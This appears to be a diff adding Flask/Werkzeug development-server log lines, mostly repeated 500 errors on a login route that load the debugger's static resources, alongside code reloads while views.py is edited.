+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:18:55] "GET /auth/login?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:18:55] "GET /auth/login?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:18:55] "GET /auth/login?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:18:55] "GET /auth/login?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:18:55] "GET /auth/login?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:18:56] "GET /auth/login?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:20:11] "GET /auth/login HTTP/1.1" 500 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:20:11] "GET /auth/login?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:20:11] "GET /auth/login?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:20:11] "GET /auth/login?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:20:11] "GET /auth/login?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:20:11] "GET /auth/login?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:20:12] "GET /auth/login?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:21:50] "GET /auth/login HTTP/1.1" 500 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:21:50] "GET /auth/login?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:21:50] "GET /auth/login?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:21:50] "GET /auth/login?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:21:50] "GET /auth/login?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:21:50] "GET /auth/login?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:21:51] "GET /auth/login?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:21:51] "GET /auth/login HTTP/1.1" 500 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:21:51] "GET /auth/login?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:21:51] "GET /auth/login?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:21:51] "GET /auth/login?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:21:52] "GET /auth/login HTTP/1.1" 500 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:21:52] "GET /auth/login?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:21:52] "GET /auth/login?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:21:52] "GET /auth/login?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:21:52] "GET /auth/login HTTP/1.1" 500 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:21:52] "GET /auth/login?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:21:52] "GET /auth/login?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:21:52] "GET /auth/login?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:21:52] "GET /auth/login HTTP/1.1" 500 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:21:52] "GET /auth/login?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:21:52] "GET /auth/login?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:21:52] "GET /auth/login?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:21:52] "GET /auth/login HTTP/1.1" 500 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:21:52] "GET /auth/login?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:21:52] "GET /auth/login?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:21:52] "GET /auth/login?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:21:52] "GET /auth/login HTTP/1.1" 500 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:21:52] "GET /auth/login?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:21:52] "GET /auth/login?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:21:52] "GET /auth/login?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:21:52] "GET /auth/login HTTP/1.1" 500 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:21:53] "GET /auth/login?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:21:53] "GET /auth/login?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:21:53] "GET /auth/login?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:21:54] "GET /auth/login?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:21:54] "GET /auth/login?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:21:54] "GET /auth/login?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug:172.105.11.111 - - [13/Dec/2019 11:46:52] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:101.251.242.238 - - [13/Dec/2019 11:55:28] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 12:10:47] "GET /auth/login HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 12:10:47] "GET /static/favicon.ico HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 12:10:48] "GET /auth/login HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 12:10:48] "GET /static/favicon.ico HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 12:10:48] "GET /auth/login HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 12:10:48] "GET /static/favicon.ico HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 12:10:49] "GET /auth/login HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 12:10:49] "GET /static/favicon.ico HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 12:10:52] "POST /auth/login HTTP/1.1" 200 -
+INFO:werkzeug:106.120.173.82 - - [13/Dec/2019 12:13:04] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 12:14:04] "POST /auth/login HTTP/1.1" 500 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 12:14:05] "GET /auth/login?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 12:14:05] "GET /auth/login?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 12:14:05] "GET /auth/login?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 12:14:05] "GET /auth/login?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 12:14:05] "GET /auth/login?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 12:14:05] "GET /auth/login?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/root/flasky/app/auth/views.py', reloading
+INFO:werkzeug: * Restarting with stat
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 12:15:23] "POST /auth/login HTTP/1.1" 500 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 12:15:23] "GET /auth/login?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 12:15:23] "GET /auth/login?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 12:15:23] "GET /auth/login?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 12:15:23] "GET /auth/login?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 12:15:23] "GET /auth/login?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 12:15:24] "GET /auth/login?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/root/flasky/app/auth/views.py', reloading
+INFO:werkzeug: * Restarting with stat
